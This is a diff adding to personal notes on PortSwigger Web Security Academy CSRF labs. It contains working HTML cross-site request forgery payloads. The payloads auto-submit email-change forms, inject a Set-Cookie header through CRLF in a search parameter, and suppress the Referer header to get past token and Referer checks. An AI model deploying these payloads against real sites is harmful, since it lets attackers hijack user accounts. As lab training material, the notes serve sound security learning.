@@ -147,13 +147,81 @@ CSRF Token
 ![](Pasted%20image%2020220514124441.png)
 
 Just need to add code to set the csrfKey cookie
+Need to keep looking through the webpages
+
+```html
+<img src="https://0a1400b70354a569c1cd589500e50056.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=4AUNHwEKzhn7G8evThlbMJcxgovvdW4Y" onerror="document.forms[0].submit()">
+
+<div id="account-content">
+    <p>Your username is: wiener</p>
+    <p>Your email is: wiener@normal-user.net</p>
+    <form class="login-form" name="change-email-form" action="https://0a1400b70354a569c1cd589500e50056.web-security-academy.net/my-account/change-email" method="POST">
+        <label>Email</label>
+        <input required="" type="email" name="email" value="">
+        <input type="hidden" name="email" value="pwned@evil-user.net" />
+        <input required="" type="hidden" name="csrf" value="kKuaPsSSqgbzIsaKzoT0CJrsJ20xyOum">
+        <button class="button" type="submit"> Update email </button>
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+</div>
+```
 
 ## CSRF where token is duplicated in cookie
 https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie
 
+```html
+<img src="https://0a57009b03ab3a2dc1d461a400610048.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=AAAABBBBCCCC" onerror="document.forms[0].submit()">
+
+<div id="account-content">
+    <form class="login-form" name="change-email-form" action="https://0a57009b03ab3a2dc1d461a400610048.web-security-academy.net/my-account/change-email" method="POST">
+        <label>Email</label>
+        <input required="" type="email" name="email" value="">
+        <input type="hidden" name="email" value="pwned@evil-user.net" />
+        <input required="" type="hidden" name="csrf" value="AAAABBBBCCCC">
+        <button class="button" type="submit"> Update email </button>
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+</div>
+```
+
 ## CSRF where Referer validation depends on header being present
 https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present
 
+```html
+<meta name="referrer" content="never">
+
+<img src="https://0a7000900402532ec00dad9b00ab007c.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=AAAABBBBCCCC" onerror="document.forms[0].submit()">
+
+<div id="account-content">
+    <form class="login-form" name="change-email-form" action="https://0a7000900402532ec00dad9b00ab007c.web-security-academy.net/my-account/change-email" method="POST">
+        <label>Email</label>
+        <input type="hidden" name="email" value="pwned@evil-user.net" />
+        <button class="button" type="submit"> Update email </button>
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+</div>
+```
 
 ## CSRF with broken Referer validation
 https://portswigger.net/web-security/csrf/lab-referer-validation-broken
+
+```html
+<meta name="referrer" content="never">
+
+<div id="account-content">
+    <form class="login-form" name="change-email-form" action="https://0a7000900402532ec00dad9b00ab007c.web-security-academy.net/my-account/change-email" method="POST">
+        <label>Email</label>
+        <input type="hidden" name="email" value="pwned@evil-user.net" />
+        <button class="button" type="submit"> Update email </button>
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+</div>
+```
